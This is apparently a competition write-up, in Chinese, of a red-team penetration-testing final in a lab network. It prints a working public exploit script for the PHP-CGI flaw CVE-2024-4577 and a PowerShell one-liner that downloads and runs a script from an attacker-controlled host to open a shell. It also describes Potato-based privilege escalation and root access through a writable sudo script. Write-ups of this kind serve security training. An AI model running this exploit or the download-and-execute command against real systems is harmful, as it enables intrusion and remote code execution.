---
title: "AEGIS final 2024 紅隊心得"
date: 2024-11-16T20:38:43+08:00
draft: false
ShowToc: true
---

# AEGIS final 2024

## 前言

這次老樣子跟 B33F 50UP 一起打了神盾，決賽是滲透測試的題目，這邊簡單記錄一下決賽我有碰的地方。

這次拿了第二名，跟第一名同分：

![image](https://hackmd.io/_uploads/S1klP5wM1g.png)

比賽前期 chumy 在處理網路的東西，讓隊員們都可以同時存取到網際網路跟題目。

## Recon

比賽開始先掃競賽網段，發現有以下服務

- `172.12.1.88`
    - 有一個 22 port
    - 有一個 5000 port 的網頁服務
- `172.0.0.55`
    - 有一個 80 port 上面放了兩個 pwn 題，交給隊友去解
- `172.0.0.66` (Windows)，簡稱 A 機器
    - 80/tcp   open  http
        - 看起來有個登入介面，掃路徑後發現有 `printenv` cgi 讓我們看環境變數
    - 88/tcp   open  kerberos-sec
    - 135/tcp  open  msrpc
    - 139/tcp  open  netbios-ssn
    - 443/tcp  open  https
    - 445/tcp  open  microsoft-ds
    - 3306/tcp open  mysql
    - 3389/tcp open  ms-wbt-server
- `-sC -sV 172.0.0.77` (Linux)，簡稱 B 機器
    - 21/tcp open  ftp     vsftpd 3.0.5
        - no pass
    - 22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
    - 25/tcp open  smtp    Postfix smtpd
    - 80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        - 看起來有個登入介面


## 找到 A 機器上的 init access

首先測試 samba no pass 行不通，再看 80 port 上的登入介面看起來沒什麼問題，但掃路徑後發現有路徑 `/sql` 跟 `/cgi-bin/printenv.pl`

發現 `/sql`，可以下載資料庫的 schema，裡面還有一些預設帳號：

```
CREATE TABLE `class` (
  `id` int(11) NOT NULL,
  `name` varchar(40) COLLATE utf8mb4_unicode_ci DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `class` (`id`, `name`) VALUES
(1, '測試');
...
...
CREATE TABLE `student` (
  `id` int(11) NOT NULL,
  `number` varchar(30) COLLATE utf8mb4_unicode_ci NOT NULL,
  `pass` int(11) NOT NULL,
  `name` varchar(20) COLLATE utf8mb4_unicode_ci NOT NULL,
  `class` int(11) NOT NULL,
  `num` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

INSERT INTO `student` (`id`, `number`, `pass`, `name`, `class`, `num`) VALUES
(1, '1234', 1234, '測試', 1, 0),
(2, '5678', 5678, '測試', 1, 0);
...
```

拿這些帳號去戳登入介面發現沒什麼料，就先回去看 `/cgi-bin/printenv.pl`：

```
COMSPEC="C:\Windows\system32\cmd.exe"
CONTEXT_DOCUMENT_ROOT="C:/xampp/cgi-bin/"
CONTEXT_PREFIX="/cgi-bin/"
DOCUMENT_ROOT="C:/xampp/htdocs"
GATEWAY_INTERFACE="CGI/1.1"
HTTP_ACCEPT="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
HTTP_ACCEPT_ENCODING="gzip, deflate"
HTTP_ACCEPT_LANGUAGE="zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6,id;q=0.5"
HTTP_CONNECTION="keep-alive"
HTTP_COOKIE="PHPSESSID=8qlcur1efqoc2h8suokv86h4br"
HTTP_HOST="172.0.0.66"
HTTP_UPGRADE_INSECURE_REQUESTS="1"
HTTP_USER_AGENT="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
MIBDIRS="C:/xampp/php/extras/mibs"
MYSQL_HOME="\xampp\mysql\bin"
OPENSSL_CONF="C:/xampp/apache/bin/openssl.cnf"
PATH="C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\user\AppData\Local\Microsoft\WindowsApps"
PATHEXT=".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC"
PHPRC="\xampp\php"
PHP_PEAR_SYSCONF_DIR="\xampp\php"
QUERY_STRING=""
REMOTE_ADDR="10.0.0.3"
REMOTE_PORT="58907"
REQUEST_METHOD="GET"
REQUEST_SCHEME="http"
REQUEST_URI="/cgi-bin/printenv.pl"
SCRIPT_FILENAME="C:/xampp/cgi-bin/printenv.pl"
SCRIPT_NAME="/cgi-bin/printenv.pl"
SERVER_ADDR="172.0.0.66"
SERVER_ADMIN="postmaster@localhost"
SERVER_NAME="172.0.0.66"
SERVER_PORT="80"
SERVER_PROTOCOL="HTTP/1.1"
SERVER_SIGNATURE="<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25 Server at 172.0.0.66 Port 80</address>\n"
SERVER_SOFTWARE="Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.1.25"
SYSTEMROOT="C:\Windows"
TMP="\xampp\tmp"
WINDIR="C:\Windows"
```

注意到這個 PHP 版本加上他是在 XAMPP for Windows，在 CVE-2024-4577 的攻擊範圍的機率非常大，先放著等等再來打這台。


## 尋找並登入 B 上傳下載介面

在 B 機器上有給予一個操作手冊 pdf，裡面提供了 `/login.php` 有檔案上傳與下載等功能，但沒有提供帳號密碼，要自己找：

![image](https://hackmd.io/_uploads/SJEqn9DfJl.png)

![image](https://hackmd.io/_uploads/Sk78lsvzyl.png)



之後隊友提醒了 ftp 可以看到檔案系統後，就去看了一下，有以下的路徑：

```
1927dcef9be9dc08f9db488f61a99a2a
baba327d241746ee0829e7e88117d4d5
c3a4f325d8282f93c03dfb552d8f358f
d41d8cd98f00b204e9800998ecf8427e
```

之後經過了一段時間，還是不知道怎麼登入 `/login.php`，只有當他登入失敗的時候會顯示 `登入失敗2` 的字串，對這不是我打錯，後面就是有一個 2。

然後就把上述看起來很像 md5 的路徑名稱拿去 `cmd5.com` 炸也不虧，於是：

```
1927dcef9be9dc08f9db488f61a99a2a:ncsist
baba327d241746ee0829e7e88117d4d5:jay
c3a4f325d8282f93c03dfb552d8f358f:hjs
d41d8cd98f00b204e9800998ecf8427e:
```

然後想說這有沒有可能是跟登入有關的？ 隨便拿一個當入 username 去登入，密碼就隨便填，然後他顯示 `登入失敗1`，笑死這該不會是代表 username 是正確的吧。

然後嘗試 username 跟 password 都設一樣就登入了 XD

登入後我們就有一個含有 上傳 跟 下載 功能的網頁服務，讓 TriangleSnake 去看上傳，我去看下載。

下載看不出問題後就讓 TriangleSnake 繼續看上傳，我先回去 A 機器嘗試 getshell。

## 取得 A 機器 services shell 與提權至 nt system

這時候主辦方有放出 hint

- web cgi php
- [Hint]部分題目具有離線版本Windows Defender!!

這時候已經可以確定當初想法是正確了（CVE-2024-4577），開打！

網路上找了隨便一個 [exploit](https://github.com/watchtowrlabs/CVE-2024-4577)，挺順利就拿下這台的 shell 了，exploit:

```python!
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
requests.packages.urllib3.disable_warnings()
import argparse

print(banner)
print("(^_^) prepare for the Pwnage (^_^)\n")

parser = argparse.ArgumentParser(usage="""python CVE-2024-4577 --target http://192.168.1.1/index.php -c "<?php system('calc')?>""")
parser.add_argument('--target', '-t', dest='target', help='Target URL', required=True)
parser.add_argument('--code', '-c', dest='code', help='php code to execute', required=True)
args = parser.parse_args()
args.target = args.target.rstrip('/')


s = requests.Session()
s.verify = False

a = input()
res = s.post(f"{args.target.rstrip('/')}?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input", data=f"<?php system('{a}'); ?>;echo 1337; die;" )
print(res.text)
if('1337' in res.text ):
    print('(+) Exploit was successful')
else:
    print('(!) Exploit may have failed')
```

拿下 flag 後， `whoami && whoami /priv` 發現是 services accounts 且具有 `SeImpersonatePrivilege` 權限，因此到這邊已經有大概率成功拿到最高權限了，先不急，把一個低權限 shell 彈回來。

```python
python3 cgi.py --target http://172.0.0.66/dinbendon/index.php -c "x" > x; cat x | less
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString(\"http://10.0.0.253:13001/pyp.ps1\")"
```

俗話說
> "if you have Impersonation privileges you are SYSTEM!" 
> @decoder_it


既然有 `Impersonation` 那簡直就是叫我們來發動 Potatos！ 這部分感謝 DEVCORE 導師 Cyku 跟 Mico 平時的訓練，這邊提權的挺順利的ＸＤ

成功躲過防毒，並且獲得了 `nt system`，且成功獲得了第二把 flag，彈一個 shell 給隊友 pwn2ooown 做持久化（關防毒、裝 c2 與設定 RDP）

這時候已經聽說 B 機器 TriangleSnake 跟 Chumy 成功 Get Shell 了，但還沒成功提權，就先跳過去看。


## 將 B 機器提權至 root，並在上面東翻西翻

在 trello 上看到有在這台上面發現 rsa key，就把它下載下來，並且透過 ssh 登入上去

`ssh jay@127.0.0.77 -i id_rsa`

成功登入後馬上 `sudo -l` 發現有一個路徑：

```
jay@kerkeryuan:~$ sudo -l
Matching Defaults entries for jay on kerkeryuan:
    env_reset, mail_badpass

User jay may run the following commands on kerkeryuan:
    (root) NOPASSWD: /home/jay/script/filter.sh

jay@kerkeryuan:~$ cat /home/jay/script/filter.sh
#!/bin/bash

# 定義 Web 日誌文件名
logfile="/var/log/apache2/access.log"

# 定義要過濾的 IP 地址
target_ip="127.0.0.1"

# 使用 grep 排除指定 IP 地址的行
grep -v "$target_ip" "$logfile" > /home/jay/backup/IP_list.txt

# backup web log
gzip -c /var/log/apache2/access.log > /home/jay/backup/$(date '+%Y-%m-%d')_access.gz
```

原本想說有沒有辦法 command injection 來提權，但隊友 pwn2ooown 問了一句：這個檔案可以改嗎，於是恍然大悟去測測看，沒想到可以修改，於是就直接去 cat `/root` 下的 flag 了，瞬間拿下第三把 flag！

之後把 jay 加入免密碼 sudo 內，並且把 Chumy 們的 ssh key 放進來，一起看這台有什麼蛛絲馬跡。


## 看看內網有什麼東西

看了一陣子遲遲不知道下一步是什麼，就開了提示，得到以下回覆：
- 可以去看看 B 機器的網卡


看了一下發現確實有另外一個網段的 IP `172.31.242.77/24`，這時候 Chumy 快速就架好了 GRE tunnel 讓隊友們都能夠直接存取這個內網網段。

之後 pwn2ooown 開始對此網段進行掃描，掃到了 `.10` 有一台 windows，看起來是 AD，不過賽後發現其他隊伍有看到其他的機器，這邊漏掉了

於是就開始打這台 Windows

```
vincent55@debian:/Users/vincent55/CTF/AEGIS_FINAL/n88$ sudo nmap 172.31.242.10
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 14:45 CST
Nmap scan report for 172.31.242.10
Host is up (0.064s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```

先發動 AS-REP Roasting 沒掃到東西後，時間剩下 15 分鐘，大概位於第三還是第四名，這時候 pwn2ooown 打下了關鍵一步，解了 `172.0.0.55` 上的 pwn，名次來到第二名，跟第一名同分。


## 結語

幾週前才剛在 DEVCORE RedTeam intern 學習到 Windows 滲透技巧，沒想到這麼快就用上了ＸＤ
整體比賽很有趣，目前只有在技能競賽的紅隊環節打過類似的競賽，每一次的體驗都不錯ouo

小小的遺憾是應該要等 nmap 把最後的內網網段掃完的，應該還能再多個一兩題。